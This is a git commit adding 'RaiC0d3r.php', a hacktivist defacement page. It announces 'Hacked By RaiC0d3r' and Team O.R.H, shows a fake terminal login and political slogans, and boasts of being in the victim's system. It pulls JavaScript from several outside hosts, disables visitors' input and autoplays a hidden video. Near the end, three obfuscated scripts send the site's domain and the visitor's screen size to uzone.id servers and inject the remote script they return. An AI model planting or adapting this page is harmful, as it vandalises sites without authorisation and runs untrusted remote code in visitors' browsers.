bf8ba82af57bc0af84dc64368434e434cd9fdfa8
raic0d3r <36988513+raic0d3r@users.noreply.github.com>
2018-04-21 21:59:04 +0200

    Add files via upload

---
+++ RaiC0d3r.php
@@ -0,0 +1,350 @@
+
+<html>
+<head>
+<script src="http://masterendi.googlecode.com/files/salju.js"></script>
+</head>
+<link rel="icon" type="image/png" href="http://4.bp.blogspot.com/-2h8LgjUDpzY/T0fTA4EQx8I/AAAAAAAAAtU/n_W5Vby8zLU/s400/hacked.gif"/>
+<style>
+body{
+background-image: url('http://bestanimations.com/Nature/Fire/fire-animated-gif-4.gif') !important; 
+	background-position: center !important;
+    background-attachment: scroll !important; 
+	background-position: center !important;
+    background-size: cover !important;
+
+}</style> 
+<script language="JavaScript">
+var numraindrops="150";
+var speed="5";
+var rainsize="2";
+var wind="left";
+var genxgallery="Hello admin";
+
+function tb5_makeArray(n){ this.length = n; return this.length;
+}
+tb5_messages = new tb5_makeArray(2);
+tb5_messages[0] = "Hacked By RaiC0d3r";
+tb5_messages[1] = "We Are Team: O.R.H";
+tb5_rptType = 'infinite';
+tb5_rptNbr = 10;
+tb5_speed = 50;
+tb5_delay = 2000;
+var tb5_counter=1;
+var tb5_currMsg=0;
+var tb5_stsmsg="";
+function tb5_shuffle(arr){
+var k;
+for (i=0; i<arr.length; i++){ k = Math.round(Math.random() * (arr.length - i - 1)) + i; temp = arr[i];arr[i]=arr[k];arr[k]=temp;
+}
+return arr;
+}
+tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_";
+}
+tb5_arr = tb5_shuffle(tb5_arr);
+function tb5_init(n){
+var k;
+if (n == tb5_arr.length){ if (tb5_currMsg == tb5_messages.length-1){ if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){ clearTimeout(tb5_timerID); return; } tb5_counter++; tb5_currMsg=0; } else{ tb5_currMsg++; } n=0; tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length); tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length); for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_"; } tb5_arr = tb5_shuffle(tb5_arr); tb5_sp=tb5_delay;
+}
+else{ tb5_sp=tb5_speed; k = tb5_arr[n]; tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k); tb5_stsmsg = ""; for (var i=0; i<tb5_sts.length; i++) tb5_stsmsg += tb5_sts[i]; document.title = tb5_stsmsg; n++; } tb5_timerID = setTimeout("tb5_init("+n+")", tb5_sp);
+}
+function tb5_randomizetitle(){ tb5_init(0);
+}
+tb5_randomizetitle();
+
+</script>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.1/jquery.min.js" type="text/javascript"></script>
+<script type="text/javascript" src="http://yourjavascript.com/7378381144/mouse.js"></script>
+	   
+	   <!-- --------Cursor--------- -->
+       <style type="text/css">body, a, a:link{cursor:url(http://www.switchsystems.ie/quinn/upload/TKCHT.png), default;} a:hover {cursor:url(http://www.switchsystems.ie/quinn/upload/TKCHT.png),wait;}</style>
+	   
+
+</script>
+
+<style>
+
+         body {
+         background	: #000;
+         background-image: url(https://c.top4top.net/p_811r940f1.jpg);
+         background-repeat:no-repeat;
+         background-attachment: fixed;
+         background-size: 1590px;
+         font-family	: Courier new;
+         text-align	: center;
+         color		: #fff;
+         }
+         pre {
+         margin-top: 9%;
+         }
+
+}
+h1 {
+padding: 10px 15px;
+margin: 0px;
+font-size: 15px;
+color: red;
+background-color: #000000;
+//background-image: -moz-linear-gradient(100% 100% 90deg, #777, #999) !important;
+//background-image: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#999), to(#777)) !important;
+color: #FFF;
+//-webkit-border-radius:8px 8px 0px 0px;
+//-moz-border-radius: 8px 8px 0px 0px;
+border-radius: 8px 8px 0px 0px;
+text-shadow:1px 1px 2px #333333;
+opacity: 0.5;
+}
+table {
+width: 565px;
+}
+table tr td{
+font-family: verdana;
+font-size: 11px;
+padding: 10px 5px;
+border-bottom: solid 1px #CCC;
+ 
+}
+#wrapper{
+width: 800px;
+margin: 10px auto;
+text-align: left;
+}
+#console{
+height: 400px;
+overflow: auto;
+background-image: url(https://image.ibb.co/nosFtb/hvbgftf.png);
+background-size: 100% 100%;
+padding: 15px;
+font-family: monospace;
+font-size: 12px;
+color: #FFF;
+}
+.content{
+padding: 15px;
+}
+#commander{
+border: solid 1px #CCC;
+padding: 5px 10px;
+-webkit-border-radius: 2px;
+-moz-border-radius: 2px;
+border-radius: 2px;
+margin: 5px;
+width: 590px;
+height: 30px;
+}
+.box{
+-moz-box-shadow: 1px 1px 8px #666;
+-webkit-box-shadow: 1px 1px 8px #666;
+box-shadow: 1px 1px 8px #40D5D2;
+border: solid 1px black;
+-webkit-border-radius: 8px 8px 0px 0px;
+-moz-border-radius: 8px 8px 0px 0px;
+border-radius: 8px 8px 0px 0px;
+margin: -35px 0px;
+background-color: #F5F5F5;
+opacity: 0.8;
+}
+#help{
+width: 300px;
+float: right;
+}
+.prefix{
+color: #0077E7;
+}
+.keyword{
+color: #9eff63;
+}
+.error{
+color: #FF0000;
+}
+.spacer{
+clear: both;
+display: block;
+}
+</style>
+<script type="text/javascript">
+// Hacked By : ./RaiC0d3r
+TypingText = function(element, interval, cursor, finishedCallback) {
+if((typeof document.getElementById == "undefined") || (typeof
+ 
+element.innerHTML == "undefined")) {
+this.running = true;
+return;
+}
+this.element = element;
+this.finishedCallback = (finishedCallback ? finishedCallback : function() {
+ 
+return; });
+this.interval = (typeof interval == "undefined" ? 100 : interval);
+this.origText = this.element.innerHTML;
+this.unparsedOrigText = this.origText;
+this.cursor = (cursor ? cursor : "");
+this.currentText = "";
+this.currentChar = 0;
+this.element.typingText = this;
+if(this.element.id == "") this.element.id = "typingtext" +
+ 
+TypingText.currentIndex++;
+TypingText.all.push(this);
+this.running = false;
+this.inTag = false;
+this.tagBuffer = "";
+this.inHTMLEntity = false;
+this.HTMLEntityBuffer = "";
+}
+TypingText.all = new Array();
+TypingText.currentIndex = 0;
+TypingText.runAll = function() {
+for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+}
+TypingText.prototype.run = function() {
+if(this.running) return;
+if(typeof this.origText == "undefined") {
+setTimeout("document.getElementById('" + this.element.id +
+ 
+"').typingText.run()", this.interval);
+return;
+}
+if(this.currentText == "") this.element.innerHTML = "";
+if(this.currentChar < this.origText.length) {
+if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+this.tagBuffer = "<";
+this.inTag = true;
+this.currentChar++;
+this.run();
+return;
+} else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+this.tagBuffer += ">";
+this.inTag = false;
+this.currentText += this.tagBuffer;
+this.currentChar++;
+this.run();
+return;
+} else if(this.inTag) {
+this.tagBuffer += this.origText.charAt(this.currentChar);
+this.currentChar++;
+this.run();
+return;
+} else if(this.origText.charAt(this.currentChar) == "&" && !
+ 
+this.inHTMLEntity) {
+this.HTMLEntityBuffer = "&";
+this.inHTMLEntity = true;
+this.currentChar++;
+this.run();
+return;
+} else if(this.origText.charAt(this.currentChar) == ";" &&
+ 
+this.inHTMLEntity) {
+this.HTMLEntityBuffer += ";";
+this.inHTMLEntity = false;
+this.currentText += this.HTMLEntityBuffer;
+this.currentChar++;
+this.run();
+return;
+} else if(this.inHTMLEntity) {
+this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+this.currentChar++;
+this.run();
+return;
+} else {
+this.currentText += this.origText.charAt(this.currentChar);
+}
+this.element.innerHTML = this.currentText;
+this.element.innerHTML += (this.currentChar < this.origText.length - 1 ?
+ 
+(typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) :
+ 
+"");
+this.currentChar++;
+setTimeout("document.getElementById('" + this.element.id +
+ 
+"').typingText.run()", this.interval);
+} else {
+this.currentText = "";
+this.currentChar = 0;
+this.running = false;
+this.finishedCallback();
+}
+}
+</script>
+ 
+ 
+<!-- AdFender script begin --><script type='text/javascript' src='http://local.adfender.com/adfender/elemhide.js'></script><!-- AdFender script end -->
+<!-- AdFender script begin --><script type='text/javascript' src='http://local.adfender.com/adfender/elemhide.js'></script><!-- AdFender script end -->
+</head>
+<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' ondragstart='return false' onselectstart='return false' style='-moz-user-select: none; cursor: default;'>
+<br/><br/>
+<div id="wrapper">
+<div class="box">
+<center>
+<h1><font size='4'><font color='black'>[|]</font><font size='4'><font color='green'>
+         <marquee width="65%" behavior="alternate" scrollamount="30">&nbsp;We Are Hackers HACKERS ISLAMIC&nbsp;</marquee>
+      </font></font><font size='4'><font color='black'>[|]</font>
+
+</h1></center>
+<div id="console"><span class="prefix">
+<p id="message">
+
+<b><font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">Username : admin <br>
+<b><font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">Password : ******<br>
+<b><font color="red">root@RaiC0d3r<font color="red">~ $</font><b><font color="green">LOGIN SUCCES!<br>
+<b><font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">Hi! <br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white"> <font color="white" size="3px"></font><font color="yellow">RaiC0d3r</font> Here :D<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">#Free Gaza<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">#Free Palestine<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">Tell Your Gov , To Know About<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">Palestine<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">We Will Countinue Hacking The Sites ,<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">To Send The Message Of Our Palestine And All Arabs<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">We Dont Accept Killing Muslims Every Where ,<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">Stop Killing US<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">#We Are O.R.H Team [Hacker Dz]<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">We Will Not End This War<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">#Attacker From<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">Muslims All Over The World<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">[!] Mr.Mino_DZ ~ OROCHI_DZ ~ MR KI*_*RO e\.g ~ Riadh_DZ ~ RaiC0d3r ~ Gse7en [!]<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">Touched by</font><font color="yellow"> RaiC0d3r<br>
+<font color="red">root@RaiC0d3r<font color="red">~ $</font><font color="white">Have a Nice Day!</font><br>
+<br>
+<br>
+<font color="red" size="4px">SORRY IM IN YOUR SYSTEM</font><br>
+<font color="yellow">RaiC0d3r<br>
+
+<br>
+ 
+<font color="red" size="4px">| Message From Me |</font><br><font color="white">
+I am a Muslim until all the Muslims pray in Al-Aqsa</font></br>
+<font color="white">NO SYSTEM IS SAFE!</font></br>
+<br>
+<font color="red">|>Gretz To<|</font><br><font color="white">./Gse7en</font></br>
+<br>
+<br>
+
+
+<br><font color="red" size="3">Notice : </font> <font color="white" size="3"> God is above us and Islam is above all :) ||</font>
+<br>
+<br>
+<font color="red">Bye Bye Good System<br>
+<a href="https://www.facebook.com/Team-ORH-1024151554398499" target_blank><font color="white">Contact us!</a></font>
+<script type="text/javascript">
+new TypingText(document.getElementById("message"), 50, function(i){ var ar
+ 
+= new Array("|", "|", "|", "|"); return " " + ar[i.length % ar.length]; });
+ 
+//Type out examples:
+TypingText.runAll();
+ 
+</script>
+<input text="test" id="commander" onkeyup="execute(this,event);" disabled="disabled" style="width:786px;"/>
+</div>
+<div class="spacer"></div>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK8s4Mlz0h6qTLfioNS1B1evExq6PYRat%2b834Xrkr7HCuGlOWNlQtpnPseaCe83gT6pswqBc4RTumQCgsOqVUK8x15psZwKh7oKOchjua4S5qzGcSke4rqhWPIKzIVP2u61Rl0%2bNiT5fHLxz1c2sbtnF6gXzNZ3AkRSNWKNDIpiXnZmGdtRKen%2btAkoUOUjaR9%2fanvdWL0%2fPZKRNUDlSEWlwMhnHavymNlZKiiwNsfV9ca31qUTfxSSd6yHm9ZNQVSlv7L4wHJtF7vFXIS8Vwt%2b2M%2fOs3kKIapzjfQpv%2frIQgcrO2bqY0tjWVKUlkD6lx%2fvc53kYhMkdfP6jRwkLTZKNaCbnHc%2fMK7wOcNfVi1rHdz%2fgd0RxKih23Yvl1zY%2b6LrbrHTJ1OJS5NyP7vT9zjwq0gaIzVRB9VHr3XjJDtxHIOBaQmKuoYhR7AFzVoZDmokdjl%2briO0Q463nnfHturJ5wLGlH3jbMpwzIwbvPyl95znlSF8Xzzt%2fqB3Oh4OOPtxNkZSw2FR7loRlbuEjOoKUNxfJaHZnpC4mqtFtQjdy35bITigwLPZLob3L%2fMj0Oo" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKUU0VqfrSV3aMWdv1ZUBfTxHZqobUa7GHA7u5vUtOXXwQEQeRZrzzjPY09LQ1ItrK9ddrPIeACNIp%2foe9aCGwZQj4up84YO1mzRte7XTB0x7v0O3ZPq03pHBz0tQgecMrRPeagYY9iJazIeU6Z4YhO1fsHwq2qG6KH6OD4L6f7zpc555TnBMyV2XvUzN16GJbIlVYWHSb9g4BBxRo%2fBPg3ujNM0lAO%2fMqs%2b5oz%2bHmBs96yJIXFiQdW84UkEI%2bGfskxKvcccv%2f111I1JNtcHrCMl9pysxf7o3Neuih0vCkF%2fMvGpptBClxCrgINwsH3CwBu9h%2fk%2bYgU5gxWjOAJb89rNrhvm9h08B3kEruAK2xhXjR5adyXP7qATYg3Ufw78rtGdGvG3uLHaYeu5Kfxt9zJQUgk6iWubN0YUSwU3qjXkES%2bvwuRnsi%2f340jES9XjZtRhUXge%2f1tIQ3H3lehRIvWvrlUF7uJUBTQfRXEBV22p%2bggcnwMGq%2bA5VjvXeC6PhlqSIditfyZtCc3pMMQ7RVDZ7kjCEvc83h" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKPgeGmFQGrgT9Bw89SH24sHG3woIyXn44wW4KEewKsw0vnZ0WQruUztR3YQUuzCCK%2fEF2TasheANpRAg7xS5pirulhiOcgTgi4vcywYCzmD8QzAIFwaw7YKHb6%2fj7TmP%2fNDRBAvOYRZBxDPLwFN%2bnhDNmiLycN43EVOIPnxdYStGSykOj2V%2b6RoXDkETQAPwsur%2b%2f8dFpA2D5dQxKQ1hOwfAjxDrLKPDGNGPoc%2brtGDaahFqM7y6yN3lp7whuASFMGORbvg5X6lNXTD2Y2WuUK8L0bgwqMbf4zkZ%2b2qVS9BA6UYuajycaJGWYXqt6FNzfF1OJyKEd3RLTRKOmWwRZT76ydZ5veIGn9d7pLG%2fHjIDA9X61VQ%2bMkvvR1LWv7lgXE8aI5zHmaerazcBogY91suiyZgX6%2fB80kOKcL1c7pLZ5YfVZGnSbF9oPYGUeKBp55VlBLEMyS%2fFquur2FdSxCT9YPkSnIKrzF%2bTHagKIDgdAOdyFXHsuzg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
+<iframe width="0" height="0" 
+
+src="https://www.youtube.com/embed/ABfWaCKDvsw?
+
+rel=0&autoplay=1&loop=1&playlist=ABfWaCKDvsw" frameborder="0"></iframe>
